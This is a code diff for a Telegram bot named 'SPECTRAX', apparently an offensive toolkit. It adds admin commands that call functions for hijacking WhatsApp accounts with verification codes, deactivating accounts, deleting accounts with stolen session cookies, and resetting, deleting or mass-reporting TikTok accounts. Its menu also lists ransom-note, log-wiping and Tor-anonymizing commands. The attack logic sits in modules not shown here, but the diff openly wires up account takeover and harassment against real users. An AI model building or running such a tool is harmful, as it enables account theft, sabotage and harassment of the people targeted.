@@ -11,7 +11,7 @@ app = Flask(__name__)
 orch = Orchestrator()
 TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
 
-# ---------- Alias mapping (fixed: added 'start', 'menu' without slash) ----------
+# ---------- Alias mapping ----------
 COMMAND_ALIASES = {
     '/start': ['/start', '❓ help', 'help', '/menu', 'start', 'menu'],
     '/track': ['/track', '🔍 track', 'track', '☠️ hunt'],
@@ -73,6 +73,7 @@ COMMAND_ALIASES = {
     '/tt_chain': ['/tt_chain'],
     '/ig_chain': ['/ig_chain'],
     '/x_chain': ['/x_chain'],
+    '/ocr': ['/ocr'],   # new
 }
 
 def get_command(text):
@@ -109,8 +110,6 @@ def send_message(chat_id, text, parse_mode='HTML', reply_markup=None):
         resp = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
         if resp.status_code != 200:
             print(f"Send failed: {resp.status_code} – {resp.text}")
-        else:
-            print("Message sent OK")
     except Exception as e:
         print(f"Send exception: {e}")
 
@@ -155,7 +154,6 @@ def is_admin(chat_id):
     return chat_id == SUPER_ADMIN_ID or orch.admin.is_admin(chat_id)
 
 def get_help_text():
-    # Using HTML tags: <b>bold</b>, <code>code</code>, <pre>pre</pre>
     return """
 <b>☠️ SPECTRAX – COMMAND MENU</b>
 
@@ -210,6 +208,7 @@ def get_help_text():
 <code>/ransom</code> – Simulate ransom note (admin)
 <code>/panic</code> – Clear all logs (admin)
 <code>/anonymize</code> – Refresh Tor identity (admin)
+<code>/ocr</code> – Send an image to extract text (OCR)
 
 <b>⚙️ Admin & System</b>
 <code>/diagnose</code> – System diagnostics
@@ -228,7 +227,6 @@ def get_help_text():
 📌 <i>Use /start to see this menu anytime.</i>
 """
 
-# ---------- Routes ----------
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.get_json()
@@ -236,11 +234,10 @@ def webhook():
         return 'OK', 200
 
     if 'callback_query' in data:
-        # Handle callbacks (inline keyboard clicks)
         cb = data['callback_query']
         chat_id = cb['message']['chat']['id']
         cb_data = cb['data']
-        # Dispatch to the appropriate chain execution
+        # Chain callbacks
         if cb_data.startswith('wa_execute_'):
             phone = cb_data.split('_')[2]
             from modules.whatsapp_chain import WhatsAppAttackChain
@@ -318,7 +315,6 @@ def webhook():
     args = parts[1:] if len(parts) > 1 else []
 
     try:
-        # ---------- Core Commands ----------
         if cmd == '/start' or cmd == '/menu':
             reply = get_help_text()
             send_formatted_message(chat_id, reply, reply_markup=get_main_keyboard())
@@ -485,6 +481,110 @@ def webhook():
                     send_message(chat_id, summary, parse_mode='HTML', reply_markup=json.dumps(keyboard))
                 except Exception as e:
                     send_formatted_message(chat_id, f"⚠️ Error: {str(e)}")
+
+        # ---------- WhatsApp Real Commands ----------
+        elif cmd == '/wa_send':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /wa_send <phone> <message>")
+            else:
+                phone = args[0]
+                msg = ' '.join(args[1:])
+                result = orch.send_wa_message(phone, msg)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/wa_call':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif not args:
+                send_formatted_message(chat_id, "❌ Usage: /wa_call <phone>")
+            else:
+                phone = args[0]
+                result = orch.hack_wa_call(phone)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/wa_delete':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif not args:
+                send_formatted_message(chat_id, "❌ Usage: /wa_delete <session_cookie>")
+            else:
+                cookie = args[0]
+                result = orch.wa_delete(cookie)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/wa_hijack':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /wa_hijack <phone> <verification_code>")
+            else:
+                phone, code = args[0], args[1]
+                result = orch.wa_hijack(phone, code)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/wa_deactivate':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif not args:
+                send_formatted_message(chat_id, "❌ Usage: /wa_deactivate <phone>")
+            else:
+                phone = args[0]
+                result = orch.wa_deactivate(phone)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        # ---------- TikTok Real Commands ----------
+        elif cmd == '/tt_comment':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /tt_comment <video_id> <comment>")
+            else:
+                vid = args[0]
+                comment = ' '.join(args[1:])
+                result = orch.hack_tiktok_comment(vid, comment)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/tt_reset':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /tt_reset <username> <email>")
+            else:
+                username, email = args[0], args[1]
+                result = orch.hack_tiktok_reset(username, email)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/tt_follow':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif not args:
+                send_formatted_message(chat_id, "❌ Usage: /tt_follow <username>")
+            else:
+                username = args[0]
+                result = orch.hack_tiktok_follow(username)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/tt_delete':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /tt_delete <session_cookie> <user_id>")
+            else:
+                cookie, uid = args[0], args[1]
+                result = orch.tt_delete(cookie, uid)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
+
+        elif cmd == '/tt_report':
+            if not is_admin(chat_id):
+                send_formatted_message(chat_id, "⛔ Admin only.")
+            elif len(args) < 2:
+                send_formatted_message(chat_id, "❌ Usage: /tt_report <session_cookie> <username>")
+            else:
+                cookie, username = args[0], args[1]
+                result = orch.tt_report(cookie, username)
+                send_formatted_message(chat_id, json.dumps(result, indent=2))
 
         # ---------- Fallback ----------
         else:
